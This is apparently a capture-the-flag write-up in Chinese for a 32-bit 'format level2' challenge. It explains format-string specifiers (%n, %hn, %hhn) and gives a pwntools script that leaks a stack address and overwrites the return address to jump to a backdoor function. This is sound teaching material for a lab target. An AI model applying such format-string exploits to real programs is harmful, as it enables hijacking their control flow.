# format level2

## 文件分析

下载`format_level2`, NX on, PIE off, Canary on, RELRO full  
ghidra分析为32位程序

## 逆向

这次打龙不能拿到flag了，但是后门函数还在，可以考虑通过写入返回地址，
跳转到后门函数处输出flag

前置知识：  
%n -> `int_32 *`; %hn -> `int_16 *`; %hhn -> `int_8 *`  
%n只能修改输入的字符串中存在的值  
可以通过%??d来控制已打印字符的数量

查看源代码，发现后门函数地址和返回地址差2个字节，可以采用%hn  
首先talk，找到返回地址，然后再talk，将后门函数写到返回地址里实现攻击

## EXPLOIT

```python
from pwn import *
sh = remote('localhost', 42673)

# payload 1
sh.sendline(b'3') # talk with dragon
sh.sendline(b'%14$p') # leak rbp value to get ret after shifting

ret = int(sh.recvuntil(b'\nBut', True)[-10:], 16) - 0x68 + 0x4c # ignore '\nBut' to get pure addr, and shift addr to ret

# payload 2
sh.sendline(b'3') # talk with dragon
sh.sendline(p32(ret) + b'%37651d%7$hn') # ret占4，0x9317 == 37651 + 4

sh.interactive()
```

Done.
